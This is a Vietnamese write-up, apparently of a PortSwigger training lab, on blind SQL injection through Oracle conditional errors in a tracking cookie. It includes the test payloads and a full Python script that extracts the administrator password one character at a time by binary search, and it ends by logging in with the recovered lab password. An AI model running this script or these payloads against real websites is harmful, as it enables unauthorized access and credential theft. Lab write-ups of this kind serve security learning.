![[Pasted image 20260610095959.png]]
# Tổng quan về lab
-Theo như description của lab thì lab dùng tracking cookie để query SQL và câu query SQL sẽ không được trả về,và không phản hồi `Welcome back` như lần trước nữa mà thay vào đó là trả về lỗi
-Ta có thông tin là có một bảng có tên `users` với 2 cột là `username` và `password`.Mục tiêu của chúng ta là khai thác việc query database có đúng hay sai của database rồi khai thác,lab sử dụng Oracle database.
# Khai thác
Ta sử dụng SQL query sau:
```SQL
' SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- 
' SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--
nếu đúng sinh ra lỗi,nếu sai web không làm gì cả
với 1=1 thì đúng sẽ sinh ra lỗi
với 1=2 thì sai sẽ không phản hồi gì cả
```
Tiếp theo ta dùng `SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a'` cho vào điều kiện của vòng lặp `WHEN` lúc này nếu ký tự đầu password của administrator là a thì trả về lỗi server còn không thì không phản hồi
Vì dùng `Burp Repeater` hơi lâu, ta sẽ viết script python,đồng thời dùng `Binary Search` để tối ưu request hơn:
```Python
import requests

url = "https://0a50005204a582ee806fa4c700dc0016.web-security-academy.net/"

s = requests.Session()
s.get(url)
tracking_id = s.cookies.get('TrackingId', '')
print(f"[*] TrackingId: {tracking_id}")

def check_condition(payload):
    # Đúng theo hint, không thêm gì sau FROM dual
    cookie_val = f"{tracking_id}' AND (SELECT CASE WHEN ({payload}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NOT NULL--"
    s.cookies.set('TrackingId', cookie_val)
    r = s.get(url)
    return r.status_code == 500

print(f"Verify 1=1: {check_condition('1=1')}")
print(f"Verify 1=2: {check_condition('1=2')}")

def extract_char(position):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),{position},1))>{mid}"
        if check_condition(payload):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low) if 32 <= low <= 126 else None

def extract_data():
    extracted = ""
    print("[+] Starting extraction...")
    for i in range(1, 30):
        char = extract_char(i)
        if not char or char == ' ':
            break
        extracted += char
        print(f"[+] Found: {extracted}")
    print(f"\n[+] Finished! Extracted: {extracted}")

extract_data()

```

![[Pasted image 20260610103612.png]]

Cuối cùng ta được mật khẩu của `administrator` là `1jpaa9oi856fsklnh32h`

Việc còn lại của ta là đăng nhập:
![[Pasted image 20260610103757.png]]

=> solved!
